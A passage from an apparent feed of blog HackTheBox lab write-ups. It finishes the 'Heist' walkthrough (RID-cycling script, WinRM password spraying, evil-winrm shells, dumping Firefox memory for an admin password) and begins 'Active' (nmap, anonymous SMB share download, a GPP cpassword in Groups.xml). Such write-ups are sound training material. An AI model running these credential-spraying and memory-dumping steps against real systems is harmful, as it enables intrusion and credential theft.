</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">sid</span><span class="o">=</span><span class="s2">&#34;S-1-5-21-4254423774-1266059056-3197185112&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1000</span> 1020<span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl"> rpcclient -U <span class="s2">&#34;hazard%stealth1agent&#34;</span> -c <span class="s2">&#34;lookupsids </span><span class="nv">$sid</span><span class="s2">-</span><span class="nv">$i</span><span class="s2">;quit&#34;</span> 10.10.10.149 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f2
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span></code></pre></div><blockquote>
<p>Note: <code>enumdomusers</code> RID returns in hexadecimal, for example a builtin administrator account has a default RID of 500 in decimal, so in hex it&rsquo;s 0x1F4.</p>
</blockquote>
<p>I saved the script as <code>rpc-userenum.sh</code> and ran it, and it returned with three valid usernames. I will add these usernames to my username wordlist.</p>
<p><div class="img-container"><img src="imgs/image-20210712105959998-1627299069625.png" alt="image-20210712105959998"  /></div>
</p>
<h3 id="shell-as-chase">Shell as Chase</h3>
<h4 id="password-spray-1">Password Spray</h4>
<p>With updated username wordlist, I could do another password spray attack on WinRM. The results shows a &ldquo;Pwn3d!&rdquo; message for user <code>chase</code> with a password of <code>Q4)sJu\Y8qz*A3?d </code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ crackmapexec winrm 10.10.10.149 -u usernames.list -p passwords.list 
</span></span><span class="line"><span class="cl">WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:10.10.10.149<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
</span></span><span class="line"><span class="cl">WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> http://10.10.10.149:5985/wsman
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>+<span class="o">]</span> None<span class="se">\c</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d <span class="o">(</span>Pwn3d!<span class="o">)</span>
</span></span></code></pre></div><h4 id="winrm---chase">WinRM - Chase</h4>
<p>I can login into the system with <code>chase</code>&rsquo;s credentials using <code>evil-winrm</code>. The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;chase&#39;</span> -p <span class="s1">&#39;Q4)sJu\Y8qz*A3?d&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
</span></span><span class="line"><span class="cl">supportdesk<span class="se">\c</span>hase
</span></span><span class="line"><span class="cl">SupportDesk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::5d4b:5294:9dc3:565c
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::5d4b:5294:9dc3:565c%15
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.149
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span><span class="line"><span class="cl">a127d...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="tools-share">Tools Share</h4>
<p>Before going further, I would like to host my essential tools using <code>impacket-smbserver</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ impacket-smbserver ef ~/tools -smb2support -username ef -password ef
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.149,49708<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\e</span>f,SUPPORTDESK<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> User SUPPORTDESK<span class="se">\e</span>f authenticated successfully
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The share then used on Heist. With this, I could use any of my tools directly from the share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> net use <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f /user:ef ef
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::<span class="se">\\</span>10.10.14.83<span class="se">\e</span>f&gt; 
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>chase</code>&rsquo;s Desktop there is another file called <code>todo.txt</code>. As the name implies, it contains to-do list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; <span class="nb">type</span> todo.txt
</span></span><span class="line"><span class="cl">Stuff to-do:
</span></span><span class="line"><span class="cl">1. Keep checking the issues list.
</span></span><span class="line"><span class="cl">2. Fix the router config.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Done:
</span></span><span class="line"><span class="cl">1. Restricted access <span class="k">for</span> guest user.
</span></span></code></pre></div><p>While looking at the WinPEAS output, I noticed multiple Firefox processes were running.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">  [+] Current TCP Listening Ports
</span></span><span class="line"><span class="cl">   [?] Check for services restricted from the outside 
</span></span><span class="line"><span class="cl">  Enumerating IPv4 connections
</span></span><span class="line"><span class="cl">         
</span></span><span class="line"><span class="cl">  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...[SNIP]...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49672         127.0.0.1             49673           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49673         127.0.0.1             49672           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49674         127.0.0.1             49675           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49675         127.0.0.1             49674           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49680         127.0.0.1             49681           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49681         127.0.0.1             49680           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49682         127.0.0.1             49683           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49683         127.0.0.1             49682           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span></code></pre></div><h4 id="dump-firefox-process">Dump Firefox Process</h4>
<p>I will employs <code>procdump64.exe</code> to dump the Firefox data from the memory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f<span class="se">\p</span>rocdump64.exe -accepteula -ma <span class="m">6868</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ProcDump v10.0 - Sysinternals process dump utility
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> 2009-2020 Mark Russinovich and Andrew Richards
</span></span><span class="line"><span class="cl">Sysinternals - www.sysinternals.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> initiated: C:<span class="se">\i</span>amf<span class="se">\f</span>irefox.exe_210712_230707.dmp
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> writing: Estimated dump file size is <span class="m">535</span> MB.
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:08<span class="o">]</span> Dump <span class="m">1</span> complete: <span class="m">536</span> MB written in 1.5 seconds
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:09<span class="o">]</span> Dump count reached.
</span></span></code></pre></div><p>Because I don&rsquo;t want to grab that fatty <code>536 MB</code> file,  I will use  <code>strings64.exe</code> and redirect the output to a text file to get some readable part from the dump file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; cmd /c <span class="s2">&#34;\\10.10.14.83\ef\strings64.exe -accepteula firefox.exe_210712_230707.dmp &gt; foxdump.txt&#34;</span>
</span></span><span class="line"><span class="cl">cmd.exe : 
</span></span><span class="line"><span class="cl">    + CategoryInfo          : NotSpecified: <span class="o">(</span>:String<span class="o">)</span> <span class="o">[]</span>, RemoteException
</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : NativeCommandError
</span></span><span class="line"><span class="cl">Strings v2.54 - Search <span class="k">for</span> ANSI and Unicode strings in binary images.
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> 1999-2021 Mark Russinovich
</span></span><span class="line"><span class="cl">Sysinternals - www.sysinternals.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; dir
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\i</span>amf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
</span></span><span class="line"><span class="cl">-a----        7/12/2021  11:07 PM      <span class="m">547841456</span> firefox.exe_210712_230707.dmp
</span></span><span class="line"><span class="cl">-a----        7/12/2021  11:18 PM      <span class="m">136871696</span> foxdump.txt
</span></span></code></pre></div><p>Searching for a string &ldquo;password&rdquo; in the converted dump file reveals the password used by admin (<code>4dD!5}x/re8]FBuZ</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; gc foxdump.txt <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;password&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;C:\Program Files\Mozilla Firefox\firefox.exe&#34;</span> localhost/login.php?login_username<span class="o">=</span>admin@support.htb<span class="p">&amp;</span><span class="nv">login_password</span><span class="o">=</span>4dD!5<span class="o">}</span>x/re8<span class="o">]</span>FBuZ<span class="p">&amp;</span><span class="nv">login</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p><strong>[Side note]</strong></p>
<p>If this was done by automation script, maybe I could try to drop a packet sniffer before dumping the whole process.</p>
<p><div class="img-container"><img src="imgs/image-20210726192951302.png" alt="image-20210726192951302"  /></div>
</p>
<h4 id="winrm---administrator">WinRM - Administrator</h4>
<p>The password <code>4dD!5}x/re8]FBuZ</code> works for administrator account.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;Administrator&#39;</span> -p <span class="s1">&#39;4dD!5}x/re8]FBuZ&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">supportdesk<span class="se">\a</span>dministrator
</span></span><span class="line"><span class="cl">SupportDesk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::60f9:33ef:49c0:aa91
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::60f9:33ef:49c0:aa91%15
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.149
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span><span class="line"><span class="cl">50dfa...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Active</title>
      <link>https://fahmifj.github.io/hackthebox/active/</link>
      <pubDate>Thu, 15 Jul 2021 13:17:29 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/active/</guid>
      <description>Finding passwords in Group Policy Preferences and roasting Kerberos</description>
      <content:encoded><![CDATA[<p>Active is an Active Directory system, it starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). Using that credentials on LDAP reveals that the administrator account has a Service Principal Name attribute of a CIFS service. This leads to a Kerberoasting attack which allows attackers to obtain the password hash of administrator account and crack it. The cracked password is used to login remotely.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Active Directory GPP</li>
<li>Kerberoasting</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Impacket</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan (after  <code>-p-</code> performed) discovers a bunch of open ports. The most notable ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can assume that this is an Active Directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,04915,49169,49172,49180 -sC -sV -oA nmap/10-tcp-allport-script-active 10.10.10.100
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-10 23:20 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.100
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.072s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE  SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp    open   domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server <span class="m">2008</span> R2 SP1<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
</span></span><span class="line"><span class="cl">88/tcp    open   kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-07-11 03:20:53Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open   msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open   ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp   open   microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp   open   kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp   open   tcpwrapped
</span></span><span class="line"><span class="cl">3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">3269/tcp  open   tcpwrapped
</span></span><span class="line"><span class="cl">4915/tcp  closed frcs
</span></span><span class="line"><span class="cl">5722/tcp  open   msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">9389/tcp  open   mc-nmf        .NET Message Framing
</span></span><span class="line"><span class="cl">47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">49152/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49153/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49154/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49155/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">49169/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49172/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49180/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 4s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-07-11T03:21:48
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2021-07-09T05:18:19
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 71.11 seconds
</span></span></code></pre></div><p><code>nmap</code> identified the domain name as <code>active.htb</code> and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) and PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I will consider these vulnerabilities as alternative methods and put them in separate post (Update! see <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">PrintNightmare</a>).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-53---dns">TCP 53 - DNS</h3>
<p>There is no zone transfer in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ dig axfr @10.10.10.100 10.10.10.100
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.100 10.10.10.100
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;</span> Transfer failed.
</span></span></code></pre></div><h3 id="tcp-139445---smb">TCP 139,445 - SMB</h3>
<p><code> smbmap</code> identifies that anonymous logon is allowed and it has read access on  <code>Replication</code> share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ smbmap -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> -H 10.10.10.100
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.100:445        Name: active.htb                                        
</span></span><span class="line"><span class="cl">        Disk                                                    Permissions     Comment
</span></span><span class="line"><span class="cl">        ----                                                    -----------     -------
</span></span><span class="line"><span class="cl">        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span class="line"><span class="cl">        C$                                                      NO ACCESS       Default share
</span></span><span class="line"><span class="cl">        IPC$                                                    NO ACCESS       Remote IPC
</span></span><span class="line"><span class="cl">        NETLOGON                                                NO ACCESS       Logon server share 
</span></span><span class="line"><span class="cl">        Replication                                             READ ONLY
</span></span><span class="line"><span class="cl">        SYSVOL                                                  NO ACCESS       Logon server share 
</span></span><span class="line"><span class="cl">        Users                                                   NO ACCESS
</span></span></code></pre></div><h4 id="replication-share">Replication Share</h4>
<p>The <code>Replication</code> share contains a lot of folders. I will download them all recursively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ smbclient -N //10.10.10.100/Replication
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">  active.htb                          D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">10459647</span> blocks of size 4096. <span class="m">5722238</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> recurse on
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> prompt of
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget * 
</span></span><span class="line"><span class="cl">getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\G</span>PT.INI of size <span class="m">23</span> as active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/GPT.INI <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The only interesting file there is the <code>Groups.xml</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active.htb» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ find . -type f -iname groups.xml                                                                            
</span></span><span class="line"><span class="cl">./Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
</span></span></code></pre></div><p>This <code>groups.xml</code> contains a <code>cpassword</code> of user <strong>active.htb\SVC_TGS</strong>. I will note this password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active.htb» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ cat ./Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
</span></span><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>?&gt;
</span></span><span class="line"><span class="cl">&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span>&gt;&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;active.htb\SVC_TGS&#34;</span> <span class="nv">image</span><span class="o">=</span><span class="s2">&#34;2&#34;</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">&#34;2018-07-18 20:46:06&#34;</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span>&gt;&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">&#34;U&#34;</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">description</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">&#34;1&#34;</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">&#34;1&#34;</span> 